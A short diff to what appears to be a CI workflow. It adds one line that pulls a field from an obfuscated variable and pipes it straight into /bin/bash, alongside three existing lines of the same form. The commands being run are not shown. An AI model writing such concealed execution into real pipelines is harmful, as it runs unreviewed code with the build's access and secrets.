@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$jptn7959" | jq -r .df27 | /bin/bash
           echo $idm8 | jq -r .j3 | /bin/bash
           printf '%s' "$sow03491" | jq -r .ypt11 | /bin/bash
+          echo $zvw5 | jq -r .ila9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
